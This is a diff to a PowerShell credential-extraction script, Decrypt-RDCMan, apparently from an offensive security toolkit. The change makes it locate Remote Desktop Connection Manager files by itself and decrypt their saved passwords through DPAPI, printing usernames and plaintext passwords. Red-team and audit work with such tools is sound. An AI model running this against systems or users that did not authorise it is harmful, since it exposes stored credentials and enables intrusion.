@@ -11,6 +11,11 @@ Author:Ben Turner @benpturner, Rich Hicks @scriptmonkey_
 
 Decrypt-RDCMan -FilePath
 #>
+    if (!$FilePath) {
+        [xml]$config = Get-Content "$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings"
+        $Xml = Select-Xml -Xml $config -XPath "//FilesToOpen/*"
+        $Xml | select-object -ExpandProperty "Node"| % {Write-Output "Decrypting file: " $_.InnerText; Decrypt-RDCMan $_.InnerText}
+    } else {
     [xml]$Types = Get-Content $FilePath
 
     $Xml = Select-Xml -Xml $Types -XPath "//logonCredentials"
@@ -20,7 +25,7 @@ Decrypt-RDCMan -FilePath
 
     # depending on the RDCMan version, we may have to use search through the #text field in the XML structure 
     $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password."#text"; $_.Domain + "\" + $_.Username + "`n" + $Pass + " - Hash: " + $_.Password."#text" + "`n"}
-
+    }
 }
 
 function Decrypt-DPAPI ($EncryptedString) {
@@ -49,3 +54,5 @@ function Decrypt-DPAPI ($EncryptedString) {
         }
     }
 }
+
+
